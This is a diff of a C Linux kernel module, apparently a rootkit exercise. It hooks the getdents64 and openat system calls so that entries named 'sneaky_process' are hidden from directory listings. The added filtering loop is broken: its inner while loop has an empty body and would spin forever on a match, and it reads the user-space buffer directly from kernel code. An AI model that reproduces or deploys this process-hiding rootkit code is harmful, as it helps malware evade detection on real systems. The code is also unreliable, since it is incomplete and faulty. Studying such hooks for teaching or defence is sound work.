@@ -13,10 +13,11 @@
 #define PREFIX "sneaky_process"
 
 struct linux_dirent64 {
-  unsigned long d_ino;
-  off_t d_off;
-  unsigned short d_reclen;
-  unsigned char d_type;
+  unsigned long d_ino;      // inode number
+  off_t d_off;              // offset to next structure
+  unsigned short d_reclen;  // size of this strucutre
+  unsigned char
+      d_type;  // type of this structure e.g. normal file, socket, directory, ...
   char d_name[];
 };
 
@@ -55,8 +56,19 @@ asmlinkage int sneaky_sys_openat(struct pt_regs * regs) {
 asmlinkage int (*original_getdents64)(struct pt_regs * regs);
 
 asmlinkage int sneaky_getdents64(struct pt_regs * regs) {
-  printk(KERN_INFO "get sneaky getdents64");
-  return (*original_getdents64)(regs);
+  // printk(KERN_INFO "get sneaky getdents64");
+  int nread = (*original_getdents64)(regs), off = 0;
+  void * entryDirent = regs->si;
+
+  for (off = 0; off < nread;) {
+    struct linux_dirent64 * curDirent = (struct linux_dirent64 *)(entryDirent + off);
+    while (strcmp(curDirent->d_name, "sneaky_process") == 0) {
+      // overwrite this structure by overwriting the content
+    }
+
+    off += curDirent->d_reclen;
+  }
+  return nread;
 }
 
 // The code that gets executed when the module is loaded
